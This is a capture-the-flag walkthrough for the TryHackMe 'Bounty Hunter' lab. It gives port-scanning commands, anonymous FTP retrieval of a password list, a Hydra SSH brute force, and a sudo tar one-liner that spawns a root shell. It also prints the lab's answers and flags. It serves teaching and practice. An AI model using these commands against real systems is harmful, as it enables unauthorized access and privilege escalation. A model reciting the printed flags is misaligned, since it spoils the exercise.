# TryHackMe - Bounty Hunter
You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

### Task 1: Living up to the title

Step 1: Deploy the Machine
Deploy the machine from Try Hack Me and ensure it is up and running.

Step 2: Scan the Target with RustScan
RustScan is a fast port scanner that integrates with Nmap to provide detailed service information. We use RustScan to quickly identify open ports and then leverage Nmap for detailed analysis.

Install RustScan
If RustScan is not already installed, download and install it from GitHub - RustScan.

Scan the Target
Execute the following RustScan command to identify open ports:

    rustscan -a 10.10.193.152 -u 5000 -- -sV -A -oN rustscan_output.txt
    -a: Specifies the target IP address.
    -u: Sets the number of parallel connections (higher values increase scan speed).
    --: Passes additional options to Nmap.
    -sV: Enables version detection.
    -A: Enables OS detection, version detection, script scanning, and traceroute.
    -oN: Outputs results to a file in normal format.

Step 3: Analyzing Scan Results
From the scan results, identify open ports and running services. Based on the example provided:

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

### Task 2: Enumeration of Services
FTP Service (Port 21)
Check for Anonymous Login
Use Nmap’s script to check if anonymous login is allowed:

    nmap -p 21 --script=ftp-anon 10.10.193.152
Connect to FTP Server
If anonymous login is allowed, connect using:

    ftp 10.10.193.152
Login with anonymous as the username and any email as the password.
Download Files
List files and download them using mget:

    ftp> ls
    ftp> mget *
Exit the FTP session after downloading.

Analyze Downloaded Files
Check the contents of the downloaded files:

    cat tasks.txt
    cat locks.txt
tasks.txt reveals the user lin wrote the task list.
locks.txt contains potential passwords for brute-forcing.

Questions and Answers
Who wrote the task list?
    lin

What service can you bruteforce with the text file found?
    SSH

SSH Service (Port 22)
Brute Force SSH Login
Use Hydra to brute-force SSH login:

    hydra -l lin -P locks.txt ssh://10.10.193.152
    -l: Specifies the username.
    -P: Specifies the password list.
Successful Login
Hydra output will reveal the correct password:

What is the user’s password?
    RedDr4gonSynd1cat3
SSH into the System
Use the discovered credentials to login:

    ssh lin@10.10.193.152
Enter the password: RedDr4gonSynd1cat3

User Flag
List the files in the home directory and capture the user flag:

    ls
    cat user.txt

User Flag:
    THM{CR1M3_SyNd1C4T3}

### Task 3: Privilege Escalation
Check for Sudo Permissions
Check which commands lin can run with sudo:

    sudo -l
Output indicates lin can run tar with sudo.

Exploit Tar Binary
Refer to GTFOBins for privilege escalation using tar.

Run Exploit
Execute the following command to escalate privileges:

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
This will spawn a root shell.
Root Flag
Once root access is gained, capture the root flag:

    whoami
    cat /root/root.txt

Root Flag:
    THM{80UN7Y_h4cK3r}

Conclusion
Following these steps, we successfully exploited the machine, gaining user and root access, and retrieved both flags. This exercise demonstrated the importance of thorough enumeration, service analysis, and privilege escalation techniques.
